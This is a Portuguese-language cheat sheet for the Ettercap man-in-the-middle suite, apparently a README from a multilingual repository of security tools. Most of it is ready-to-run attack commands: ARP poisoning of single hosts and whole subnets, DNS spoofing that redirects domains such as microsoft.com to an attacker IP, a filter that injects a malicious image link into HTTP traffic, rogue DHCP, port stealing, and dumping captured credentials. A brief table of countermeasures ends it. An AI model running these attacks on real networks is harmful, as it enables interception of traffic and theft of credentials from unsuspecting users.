<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# Folha de dicas do Ettercap

[Ettercap](https://www.ettercap-project.org/) é um conjunto abrangente para ataques man-in-the-middle (MITM) em redes locais (LAN). Ele apresenta detecção de conexões ao vivo, filtragem de conteúdo em tempo real, dissecação ativa e passiva de muitos protocolos e suporte para envenenamento de ARP, redirecionamentos de ICMP, falsificação de DHCP e roubo de porta.

---

## Índice

- [Arquitetura e modos principais](#core-architecture--modes)
- [Instalação e configuração rápida](#instalação--configuração rápida)
- [Envenenamento e cheiro de ARP](#arp-poisoning--sniffing)
- [Ataques de falsificação de DNS](#dns-spoofing-attacks)
- [Filtragem de pacotes personalizados (`etterfilter`)](#custom-packet-filtering-etterfilter)
- [Spoofing de DHCP e roubo de porta](#dhcp-spoofing--roubo de porta)
- [Registro e extração de pacotes](#logging--extração de pacotes)
- [Detecção defensiva e contramedidas](#detecção defensiva--contramedidas)

---

## Arquitetura e modos principais

Ettercap oferece suporte a vários modos de execução:
- **`-T` (modo de texto):** Saída de terminal leve e sem maldições, ideal para scripts e automação sem cabeça.
- **`-C` (modo Curses):** UI de terminal baseada em Ncurses para operações interativas sem X11.
- **`-G` (modo GTK):** Interface gráfica completa.
- **`-D` (modo Daemon):** Executa silenciosamente em segundo plano.

Sintaxe de especificação de destino:
```text
/MAC/IPs/IPv6/PORTs
```
- Os alvos podem ser separados por vírgula ou intervalos de IP: `//` corresponde a tudo.
- Exemplo: `/192.168.1.50/` tem como alvo o IP `192.168.1.50` em todas as portas.
- Exemplo: `//80,443/` tem como alvo todos os hosts nas portas 80 e 443.

---

## Instalação e configuração rápida
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y ettercap-text-only ettercap-graphical

# Arch Linux / BlackArch
sudo pacman -S ettercap

# Enable IP forwarding on the host system
sudo sysctl -w net.ipv4.ip_forward=1
```
Verifique os locais dos arquivos de configuração:
- `/etc/ettercap/etter.conf`: Rede principal e configuração de eliminação de privilégios.
- `/etc/ettercap/etter.dns`: tabela de consulta de registros de falsificação de DNS.

---

## Envenenamento e detecção de ARP

### 1. Envenenamento remoto bidirecional por ARP
Envenenar tabelas ARP entre uma estação de trabalho de destino e o gateway de rede:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-T`: Modo texto.
- `-q`: Modo silencioso (reduz a verbosidade, exibe apenas credenciais capturadas).
- `-i eth0`: Interface de rede de escuta e injeção.
- `-M arp:remote`: Executa envenenamento ARP man-in-the-middle bidirecional.

### 2. Sniffing de toda a sub-rede (unidirecional/transmissão)
Envenenar todos os hosts na sub-rede contra o gateway padrão:
```bash
sudo ettercap -T -q -i eth0 -M arp:remote // /192.168.1.1//
```
### 3. Apenas cheirar passivamente
Capture credenciais de texto simples passando pelo host atual sem falsificação de ARP:
```bash
sudo ettercap -T -q -i eth0
```
---

## Ataques de falsificação de DNS

Ettercap inclui plug-ins integrados, incluindo `dns_spoof`.

### Etapa 1: Configurar `/etc/ettercap/etter.dns`
Adicione curinga ou redirecionamento de domínio específico:
```text
# Redirect target domain to attacker machine
target.corp.local      A   192.168.1.100
*.target.corp.local    A   192.168.1.100
microsoft.com          A   192.168.1.100
```
### Etapa 2: Inicie o Ettercap com plug-in DNS
```bash
sudo ettercap -T -q -i eth0 -P dns_spoof -M arp:remote /192.168.1.50// /192.168.1.1//
```
- `-P dns_spoof`: Ativa o plugin de falsificação de DNS.
- Consultas DNS interceptadas correspondentes a `etter.dns` retornam o IP do invasor.

---

## Filtragem de pacotes personalizada (`etterfilter`)

O Ettercap permite inspeção de pacotes em tempo real e modificação de carga útil usando scripts de filtro personalizados.

### 1. Gravar script de filtro (`replace_img.filter`)
```text
if (ip.proto == TCP && tcp.dst == 80) {
    if (search(DATA.data, "Accept-Encoding")) {
        replace("Accept-Encoding", "Accept-Rubbish");
    }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("img src=", "img src=\"http://192.168.1.100/evil.jpg\" ");
    msg("[*] Injected malicious image link!\n");
}
```
### 2. Compilar filtro com `etterfilter`
```bash
etterfilter replace_img.filter -o replace_img.ef
```
### 3. Executar com filtro
```bash
sudo ettercap -T -q -i eth0 -F replace_img.ef -M arp:remote /192.168.1.50// /192.168.1.1//
```
---

## Falsificação de DHCP e roubo de porta

### 1. Ataque desonesto ao servidor DHCP
Responda mais rápido que o servidor DHCP legítimo para atribuir gateways não autorizados e endereços DNS:
```bash
sudo ettercap -T -i eth0 -M dhcp:192.168.1.200-250/255.255.255.0/192.168.1.1
```
- Sintaxe: `dhcp:<ip_pool_start-end>/<netmask>/<dns_ip>`

### 2. Ataque de roubo de porta (inundação de switch/abuso de tabela CAM)
Roubar tráfego em redes comutadas onde o envenenamento por ARP é bloqueado ou alertado:
```bash
sudo ettercap -T -q -i eth0 -M port /192.168.1.50// /192.168.1.1//
```
---

## Registro e extração de pacotes

### Salvar sessões capturadas brutas
```bash
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.50// /192.168.1.1// -w capture.pcap -L ettercap_log
```
- `-w capture.pcap`: Grava dados brutos de pacotes pcap.
- `-L ettercap_log`: Escreva registros de texto dissecados e legíveis por humanos.

### Converter logs binários com `etterlog`
```bash
# Print captured credentials and passwords
etterlog -p ettercap_log.eci

# Extract traffic in pcap format
etterlog -c -F TCP:192.168.1.50:80 ettercap_log.ecp -w http_session.pcap
```
---

## Detecção defensiva e contramedidas

| Vetor | Mecanismo de detecção e defesa |
|---|---|
| **Falsificação de ARP** | Habilite a inspeção dinâmica de ARP (DAI) em switches gerenciados; inspecione `arp -a` em busca de MACs duplicados; execute `arpwatch` ou `arpon`. |
| **Falsificação de DNS** | Aplique DNSSEC, DoH (DNS sobre HTTPS) ou DoT (DNS sobre TLS). |
| **Falsificação de DHCP** | Habilite o DHCP Snooping em switches para designar portas de uplink confiáveis. |
| **Roubo de porta** | Implemente controle de acesso à rede (NAC) 802.1X e segurança de porta com limites MAC por porta do switch. |